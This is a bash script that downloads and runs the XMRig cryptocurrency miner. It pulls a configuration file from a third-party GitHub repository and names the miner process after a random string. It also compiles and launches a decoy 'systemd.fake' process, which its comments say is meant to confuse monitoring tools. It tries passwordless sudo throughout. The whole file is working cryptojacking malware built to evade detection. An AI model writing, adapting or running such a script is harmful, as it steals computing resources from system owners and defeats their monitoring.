#!/bin/bash

xmrver="6.22.2"

if [ -d /tmp ]; then
    echo "/tmp exists"
else
    # create tmp if it doesn't exist (yes that happened...)
    sudo -n mkdir /tmp
    sudo -n chmod 777 /tmp
fi

# remove any aliases
unalias -a

# try to install wget and util-linux
sudo -n apt update
sudo -n apt install -y wget util-linux
sudo -n apk add wget util-linux
sudo -n dnf install wget util-linux

if command -v wget >/dev/null 2>&1; then
    DOWNLOAD_CMD="wget"
else
    DOWNLOAD_CMD="curl -OL"
fi

mkdir -p /tmp/xmrig
# run the script in /tmp/xmrig, after the script checks if it exists or not
cd /tmp/xmrig

# use curl because it's present on more distributions
$DOWNLOAD_CMD https://github.com/xmrig/xmrig/releases/download/v$xmrver/xmrig-$xmrver-linux-static-x64.tar.gz
tar -xf xmrig-$xmrver-linux-static-x64.tar.gz
cd xmrig-$xmrver

# just to be extra safe
chmod +x xmrig

rm -f config.json
$DOWNLOAD_CMD https://raw.githubusercontent.com/gorguzaaaaz/kerala/refs/heads/main/config.json
randnum=$(( RANDOM % 1000 + 1 ))
sed -i "s/kasm/kasm-$randnum/g" config.json

# Create and run a fake process to confuse monitoring tools
echo -e '#include <stdio.h>\nint main(){while(1) sleep(9999);}' > /tmp/fake.c
gcc -o /tmp/systemd.fake /tmp/fake.c
nohup /tmp/systemd.fake > /dev/null 2>&1 &

# Run xmrig under a disguised name
randname=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 10 | head -n 1)
mv xmrig $randname
chmod +x $randname
nohup ./$randname > /dev/null 2>&1 &

sudo -n ./$randname
./$randname
